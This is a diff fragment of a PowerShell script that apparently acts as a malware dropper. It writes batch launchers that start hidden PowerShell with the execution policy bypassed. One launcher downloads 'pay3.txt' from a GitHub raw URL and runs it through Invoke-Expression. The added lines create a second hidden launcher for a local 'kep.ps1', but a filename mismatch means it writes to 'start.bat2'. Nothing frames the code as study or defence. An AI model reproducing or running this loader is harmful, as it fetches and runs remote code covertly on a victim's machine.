@@ -7,6 +7,12 @@ if (!($testbat)){
 New-Item start.bat
 Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
 }
+$testbat2 = Test-Path start2.bat
+if (!($testbat2)){
+New-Item start2.bat
+Set-Content start.bat2 "powershell  -w hidden -Exec ByPass -NoProfile -c 'cd .. ; ./kep.ps1 '"
+}
+cd ..
 $testkep = Test-Path kep.ps1
 if (!($testkep)){
 New-Item kep.ps1
